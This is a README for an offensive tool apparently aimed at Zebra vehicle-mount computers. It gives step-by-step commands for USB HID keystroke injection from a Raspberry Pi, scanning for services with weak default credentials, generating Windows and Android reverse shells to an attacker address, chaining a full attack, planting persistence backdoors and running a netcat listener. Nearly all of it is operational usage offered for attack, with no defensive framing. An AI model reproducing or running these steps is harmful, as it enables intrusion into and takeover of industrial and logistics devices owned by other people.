# Zebra Vehicle Mount Computer Attack Framework

## Specialized Offensive Capabilities for Zebra Systems

### Zebra-Specific Attack Vectors
- **USB HID Attacks**: Keyboard emulation for Zebra systems
- **Network Exploitation**: Zebra-specific service exploitation
- **Reverse Shells**: Platform-specific payloads (Windows/Android)
- **Persistence**: Zebra system backdoors

## Setup Instructions

1. **Hardware Setup**:
   ```bash
   # Raspberry Pi Zero or other Linux device with USB OTG
   # Connect to Zebra vehicle mount computer via USB
   ```

2. **Software Setup**:
   ```bash
   sudo ./setup.sh
   sudo python3 zebra_vehicle_attack.py --help
   ```

3. **Verify Setup**:
   ```bash
   ls /dev/hidg0  # Should show USB HID device
   ```

## Usage Examples

### USB HID Attacks
```bash
# Type text via USB
sudo python3 zebra_vehicle_attack.py usb type "Hello Zebra"

# Execute command on Windows Zebra system
sudo python3 zebra_vehicle_attack.py usb exec "whoami" --platform windows

# Execute command on Android Zebra system
sudo python3 zebra_vehicle_attack.py usb exec "id" --platform android
```

### Network Attacks
```bash
# Zebra-specific port scan
sudo python3 zebra_vehicle_attack.py net scan 192.168.1.100

# Generate Zebra reverse shell (Windows)
sudo python3 zebra_vehicle_attack.py net shell 10.0.0.5 4444 --platform windows

# Generate Zebra reverse shell (Android)
sudo python3 zebra_vehicle_attack.py net shell 10.0.0.5 4444 --platform android
```

### Full Attack
```bash
# Complete Zebra attack sequence
sudo python3 zebra_vehicle_attack.py attack 192.168.1.100 10.0.0.5 4444 --platform windows
```

### Persistence
```bash
# Create persistence on Zebra system
sudo python3 zebra_vehicle_attack.py persist --platform windows
```

## Zebra-Specific Attack Techniques

### 1. Zebra Service Exploitation
Zebra systems often have these vulnerable services:
- **Modbus (502)**: Industrial control protocol
- **Telnet (23)**: Often with default credentials
- **FTP (21)**: File transfer with weak authentication
- **HTTP (80)**: Web interfaces with vulnerabilities

### 2. Zebra Reverse Shells
```bash
# Windows Zebra system
sudo python3 zebra_vehicle_attack.py net shell 10.0.0.5 4444 --platform windows

# Android Zebra system
sudo python3 zebra_vehicle_attack.py net shell 10.0.0.5 4444 --platform android
```

### 3. Zebra Persistence
```bash
# Windows persistence
sudo python3 zebra_vehicle_attack.py persist --platform windows

# Android persistence
sudo python3 zebra_vehicle_attack.py persist --platform android
```

## Listener Setup

For reverse shells, set up a listener on your attack machine:
```bash
nc -lvnp 4444
```
